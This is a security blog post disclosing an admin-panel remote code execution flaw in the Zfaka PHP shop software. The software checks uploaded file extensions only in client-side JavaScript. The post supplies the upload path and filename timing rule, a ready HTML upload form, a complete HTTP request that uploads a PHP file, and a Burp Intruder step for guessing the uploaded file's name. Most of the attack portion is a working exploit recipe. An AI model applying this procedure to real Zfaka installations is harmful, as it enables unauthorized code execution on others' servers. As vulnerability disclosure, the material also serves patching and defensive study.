=== Content from www.cnblogs.com_3b24e9fe_20250114_221453.html ===


* [![博客园Logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [终身会员](https://cnblogs.vip/buy?modalOpen=true&buyingProduct=vip-lifetime)
* [周边](https://cnblogs.vip/store)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/18341478)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)
  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)
  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  简洁模式 ![](/images/lite-mode-check.svg)...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/J0o1ey/)
# [J0o1ey的博客](https://www.cnblogs.com/J0o1ey)

## 记录所思所想，做专业的网络安全，渗透测试，代码审计，红蓝对抗技术BLOG

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/J0o1ey/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/J0o1ey)
* 订阅
* [管理](https://i.cnblogs.com/)

# [Zfaka Backend RCE(All version)](https://www.cnblogs.com/J0o1ey/p/15858138.html "发布于 2022-01-31 11:17")

in the background file upload, Zfaka only has one JS check in \public\res\layui\lay\modules\upload.js

there is no filtering for the file extension, and there is only one front-end JS verification, So disabling JS can directly implement the background rce

![image-20210526205833957](https://i.loli.net/2021/05/26/SjJafoTI2K6N3lA.png)

The controller of upload in the background is located in \application\modules\Admin\controllers\Products.php

The upload path will not be returned after the file is uploaded, but we already know the upload path and the naming rules of the uploaded file

![image-20210526204139761](https://i.loli.net/2021/05/26/IGrMv2QtBoK31Ey.png)

UPLOAD\_ Path is defined as follows

```

define('UPLOAD_PATH', APP_PATH.'/public/res/upload/');

```

CUR\_ Date is defined as follows

```

define('CUR_DATE', date('Y-m-d'));

```

file name

```

$filename=date("His"); // Hour + minute + second

```

Taking 21:05 as an example, the output results are as follows

![image-20210526210650296](https://i.loli.net/2021/05/26/OYBvblwyEn8hL3J.png)

Take 21:05:44 on May 26, 2021 as an example

The full file path is

```

http://www.xxx.com/res/upload/2021-05-26/210444.php

```

Construct form directly

```

<meta charset="utf-8">

<form action=" http://xxx.top/Admin/products/imgurlajax " method="post" enctype="multipart/form-data">

<label for="file">File:</label>

<input type="file" name="file" id="file" />

<input type="text" name="pid" id="pid" /> <--! Remember to modify the PID to the ID of the commodity (you can get it by selecting the commodity packet capture in the background) - > < / -! >

<input type="submit" value="Upload" />

</form>

```

At the same time, you need to add referers: <http://xxx.top/Admin/products/imgurl/?id=1> , and modify the

Otherwise, "please select product ID" will be prompted

Finally, the complete upload HTTP request is as follows

```

POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1

Host: xxxx

Content-Length: 291

Accept: application/json, text/javascript, */*; q=0.01

DNT: 1

X-Requested-With: XMLHttpRequest

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0eb

Origin: http://47.105.132.207

Referer: http://xxx.top/Admin/products/imgurl/?id=12

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh; q=0.9,en; q=0.8

Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaq

Connection: close

------WebKitFormBoundaryeSrhtSPGxub0H0eb

Content-Disposition: form-data; name="file"; filename="test.php"

Content-Type: image/png

<? php

phpinfo();

------WebKitFormBoundaryeSrhtSPGxub0H0eb

Content-Disposition: form-data; name="pid"

12

------WebKitFormBoundaryeSrhtSPGxub0H0eb--

```

Direct upload succeeded

Then run the last seconds with burpsuite intruder

After all, the number of seconds can't be so accurate

![image-20210526212753095](https://i.loli.net/2021/05/26/n8phY6lVJbKaBPd.png)

![image-20210526233749316](https://i.loli.net/2021/05/26/VbxMQNrkJFA7mo9.png)

posted @
2022-01-31 11:17
[J0o1ey](https://www.cnblogs.com/J0o1ey)
阅读(370)
评论(0)
[编辑](https://i.cnblogs.com/EditPosts.aspx?postid=15858138)
收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201072501456-2052907165.jpg)](https://www.doubao.com?channel=cnblogs&source=hw_db_cnblogs)

### 公告

Copyright © 2025 J0o1ey

Powered by .NET 9.0 on Kubernetes


